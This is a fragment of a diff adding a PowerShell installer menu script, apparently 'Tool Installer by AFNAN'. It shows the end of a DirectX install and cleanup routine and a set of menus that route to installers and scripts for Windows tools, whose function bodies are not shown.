+    Start-Process -FilePath $dxSetup.FullName -Verb RunAs
+
+    # 7. Timer and Cleanup
+    Write-Host ""
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "The installer has been launched." -ForegroundColor Green
+    Write-Host "Waiting 30 seconds before deleting temporary files..." -ForegroundColor Gray
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Start-Sleep -Seconds 30
+
+    Write-Host ""
+    Write-Host "Cleaning up temporary files..." -ForegroundColor Gray
+    Remove-Item $dxZip -Force -ErrorAction SilentlyContinue
+    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+
+    if (Test-Path $tempDir) {
+        Write-Host "[NOTE] Some files are still in use by the installer and couldn't be deleted." -ForegroundColor Yellow
+    } else {
+        Write-Host "Cleanup successful." -ForegroundColor Green
+    }
+    Write-Host ""
+    Pause
+}
+
+# ==============================
+# MAIN MENU LOOP
+# ==============================
+function Show-MainMenu {
+    Clear-Host
+    Show-AsciiHeader
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "  =                    MAIN MENU - Press Key                     =" -ForegroundColor White
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+    Write-Host "   [1] About AFNAN                 [2] PowerShell Tweaks" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [3] >> Essential <<             [4] Run Scripts" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [5] Recommended Tools           [6] Automation" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [7] AI in PC                    [8] Context Menu" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [9] System Tools                [0] Productivity Apps" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "   [Z] exit" -ForegroundColor Red
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+
+    $choice = Read-Host "   Your Choice"
+    
+    switch ($choice) {
+        "1" { Show-AboutAfnan }
+        "2" { Show-PowerShellMenu }
+        "3" { Show-EssentialMenu }
+        "4" { Show-RunScriptsMenu }
+        "5" { Show-RecommendedTools }
+        "6" { Show-AutomationMenu }
+        "7" { Show-AiInPcMenu }
+        "8" { Show-ContextMenuMenu }
+        "9" { Show-SystemDevMenu }
+        "0" { Show-ProductivityMenu }
+        "Z" { Confirm-Exit }
+        "z" { Confirm-Exit }
+        default { Show-MainMenu }
+    }
+}
+
+function Show-AboutAfnan {
+    Clear-Host
+    Show-AsciiHeader
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "  =                    ABOUT AFNAN                               =" -ForegroundColor White
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+    Write-Host "   This tool was created by AFNAN to help you quickly install" -ForegroundColor Gray
+    Write-Host "   and configure various Windows tools, utilities, and scripts." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "   Features:" -ForegroundColor Cyan
+    Write-Host "   - PowerShell policy management" -ForegroundColor Gray
+    Write-Host "   - Essential development tools installation" -ForegroundColor Gray
+    Write-Host "   - Popular scripts and utilities" -ForegroundColor Gray
+    Write-Host "   - AI tools and automation setup" -ForegroundColor Gray
+    Write-Host "   - System customization options" -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "   Portfolio: https://afnan-nex.github.io/portfolio/" -ForegroundColor Yellow
+    Write-Host ""
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "   [1] Open Portfolio       [Z] Go Back" -ForegroundColor White
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+
+    $choice = Read-Host "   Your Choice"
+    
+    switch ($choice) {
+        "1" { OPENPORTFOLIO; Show-AboutAfnan }
+        "Z" { Show-MainMenu }
+        "z" { Show-MainMenu }
+        default { Show-AboutAfnan }
+    }
+}
+
+function Show-PowerShellMenu {
+    Clear-Host
+    Show-AsciiHeader
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "  =                 POWERSHELL TWEAKS                            =" -ForegroundColor White
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+    Write-Host "   [1] See Policy" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [2] Unrestrict Policy" -ForegroundColor Green
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "   [Z] Go Back" -ForegroundColor Red
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+
+    $choice = Read-Host "   Your Choice"
+    
+    switch ($choice) {
+        "1" { SEEPOLICY; Show-PowerShellMenu }
+        "2" { UNRESTRICT; Show-PowerShellMenu }
+        "Z" { Show-MainMenu }
+        "z" { Show-MainMenu }
+        default { Show-PowerShellMenu }
+    }
+}
+
+function Show-EssentialMenu {
+    Clear-Host
+    Show-AsciiHeader
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "  =               >>>>>> ESSENTIAL <<<<<<                 =" -ForegroundColor White
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+    Write-Host "   [1] Chocolatey" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [2] Node.js LTS" -ForegroundColor Green
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "   [Z] Go Back" -ForegroundColor Red
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+
+    $choice = Read-Host "   Your Choice"
+    
+    switch ($choice) {
+        "1" { CHOCO; Show-EssentialMenu }
+        "2" { NODELTS; Show-EssentialMenu }
+        "Z" { Show-MainMenu }
+        "z" { Show-MainMenu }
+        default { Show-EssentialMenu }
+    }
+}
+
+function Show-RunScriptsMenu {
+    Clear-Host
+    Show-AsciiHeader
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "  =                    RUN SCRIPTS                               =" -ForegroundColor White
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+    Write-Host "   [1] Chris Titus Tool          [4] IDM" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [2] Mass Grave                [5] Sparkle" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [3] Coporton                  [6] GHGrab (GitHub Repo Grabber)" -ForegroundColor Green
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "   [Z] Go Back" -ForegroundColor Red
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+
+    $choice = Read-Host "   Your Choice"
+    
+    switch ($choice) {
+        "1" { TITUS; Show-RunScriptsMenu }
+        "2" { MASSGRAVE; Show-RunScriptsMenu }
+        "3" { COPORTON; Show-RunScriptsMenu }
+        "4" { IDM; Show-RunScriptsMenu }
+        "5" { SPARKLE; Show-RunScriptsMenu }
+        "6" { GHGRAB; Show-RunScriptsMenu }
+        "Z" { Show-MainMenu }
+        "z" { Show-MainMenu }
+        default { Show-RunScriptsMenu }
+    }
+}
+
+function Show-RecommendedTools {
+    Clear-Host
+    Show-AsciiHeader
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "  =                 RECOMMENDED TOOLS                            =" -ForegroundColor White
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+    Write-Host "   [1] Git              [5] 7-Zip" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [2] Python           [6] WinDirStat" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [3] .NET Runtime     [7] yt-dlp" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [4] FFmpeg           [8] ngrok" -ForegroundColor Green
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "   [Z] Go Back" -ForegroundColor Red
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+
+    $choice = Read-Host "   Your Choice"
+    
+    switch ($choice) {
+        "1" { GIT; Show-RecommendedTools }
+        "2" { PYTHON; Show-RecommendedTools }
+        "3" { DOTNET; Show-RecommendedTools }
+        "4" { FFMPEG; Show-RecommendedTools }
+        "5" { SEVENZIP; Show-RecommendedTools }
+        "6" { WINDIRSTAT; Show-RecommendedTools }
+        "7" { YTDLP; Show-RecommendedTools }
+        "8" { NGROK; Show-RecommendedTools }
+        "Z" { Show-MainMenu }
+        "z" { Show-MainMenu }
+        default { Show-RecommendedTools }
+    }
+}
+
+function Show-AutomationMenu {
+    Clear-Host
+    Show-AsciiHeader
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "  =                     AUTOMATION                               =" -ForegroundColor White
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+    Write-Host "   [1] n8n Workflow Automation" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [2] Google Workspace CLI (GWS)" -ForegroundColor Green
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "   [Z] Go Back" -ForegroundColor Red
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+
+    $choice = Read-Host "   Your Choice"
+    
+    switch ($choice) {
+        "1" { N8N; Show-AutomationMenu }
+        "2" { GWS; Show-AutomationMenu }
+        "Z" { Show-MainMenu }
+        "z" { Show-MainMenu }
+        default { Show-AutomationMenu }
+    }
+}
+
+function Show-AiInPcMenu {
+    Clear-Host
+    Show-AsciiHeader
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "  =                      AI IN PC                                =" -ForegroundColor White
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+    Write-Host "   [1] Google Gemini CLI" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [2] Qwen AI CLI" -ForegroundColor Green
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "   [Z] Go Back" -ForegroundColor Red
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+
+    $choice = Read-Host "   Your Choice"
+    
+    switch ($choice) {
+        "1" { GEMINI; Show-AiInPcMenu }
+        "2" { QWEN; Show-AiInPcMenu }
+        "Z" { Show-MainMenu }
+        "z" { Show-MainMenu }
+        default { Show-AiInPcMenu }
+    }
+}
+
+function Show-ContextMenuMenu {
+    Clear-Host
+    Show-AsciiHeader
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "  =                    CONTEXT MENU                              =" -ForegroundColor White
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+    Write-Host "   [1] Windows 11 New Context Menu" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [2] Windows 10 Classic Context Menu" -ForegroundColor Green
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "   [Z] Go Back" -ForegroundColor Red
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+
+    $choice = Read-Host "   Your Choice"
+    
+    switch ($choice) {
+        "1" { WIN11MENU; Show-ContextMenuMenu }
+        "2" { WIN10MENU; Show-ContextMenuMenu }
+        "Z" { Show-MainMenu }
+        "z" { Show-MainMenu }
+        default { Show-ContextMenuMenu }
+    }
+}
+
+function Show-SystemDevMenu {
+    Clear-Host
+    Show-AsciiHeader
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "  =                         SYSTEM TOOLS                         =" -ForegroundColor White
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+    Write-Host "   [1] Winget              [6] Scrcpy GUI" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [2] Everything          [7] Cursor" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [3] CMD Clr 0a          [8] VC++ Runtimes" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [4] RustDesk            [9] DirectX" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [5] HiBit Uninstaller" -ForegroundColor Green
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "   [Z] Go Back" -ForegroundColor Red
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+
+    $choice = Read-Host "   Your Choice"
+    
+    switch ($choice) {
+        "1" { WINGET; Show-SystemDevMenu }
+        "2" { EVERYTHING; Show-SystemDevMenu }
+        "3" { CMD0A; Show-SystemDevMenu }
+        "4" { RUSTDESK; Show-SystemDevMenu }
+        "5" { HIBIT; Show-SystemDevMenu }
+        "6" { SCRCPY; Show-SystemDevMenu }
+        "7" { CUR; Show-SystemDevMenu }
+        "8" { VCREDIST; Show-SystemDevMenu }
+        "9" { DIRECTX; Show-SystemDevMenu }
+        "Z" { Show-MainMenu }
+        "z" { Show-MainMenu }
+        default { Show-SystemDevMenu }
+    }
+}
+
+function Show-ProductivityMenu {
+    Clear-Host
+    Show-AsciiHeader
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "  =                       PRODUCTIVITY APPS                      =" -ForegroundColor White
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+    Write-Host "   [1] Office365           [5] LocalSend" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [2] Chrome              [6] Notepad++" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [3] Zen Browser         [7] ShareX" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "   [4] OBS Studio" -ForegroundColor Green
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "   [Z] Go Back" -ForegroundColor Red
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+
+    $choice = Read-Host "   Your Choice"
+    
+    switch ($choice) {
+        "1" { OFFICE365; Show-ProductivityMenu }
+        "2" { CHROME; Show-ProductivityMenu }
+        "3" { ZEN; Show-ProductivityMenu }
+        "4" { OBS; Show-ProductivityMenu }
+        "5" { LOCALSEND; Show-ProductivityMenu }
+        "6" { NOTEPADPP; Show-ProductivityMenu }
+        "7" { SHAREX; Show-ProductivityMenu }
+        "Z" { Show-MainMenu }
+        "z" { Show-MainMenu }
+        default { Show-ProductivityMenu }
+    }
+}
+
+function Confirm-Exit {
+    Clear-Host
+    Show-AsciiHeader
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host "  =                    CONFIRM EXIT                              =" -ForegroundColor White
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+    Write-Host "   Do you want to exit the script?" -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "   [1] Yes - Exit Script" -ForegroundColor Green
+    Write-Host "   [Z] No  - Return to Main Menu" -ForegroundColor Red
+    Write-Host ""
+    Write-Host "  ================================================================" -ForegroundColor White
+    Write-Host ""
+
+    $choice = Read-Host "   Press 1 to exit, Z to return"
+    
+    if ($choice -eq "1") {
+        Write-Host ""
+        Write-Host "   Thank you for using Tool Installer by AFNAN! Goodbye." -ForegroundColor Cyan
+        Write-Host ""
+        Start-Sleep -Seconds 2
+        exit
+    } elseif ($choice -eq "Z" -or $choice -eq "z") {
+        Show-MainMenu
+    } else {
+        Confirm-Exit
+    }
+}
+
+# ==============================
+# START
+# ==============================
+Show-MainMenu
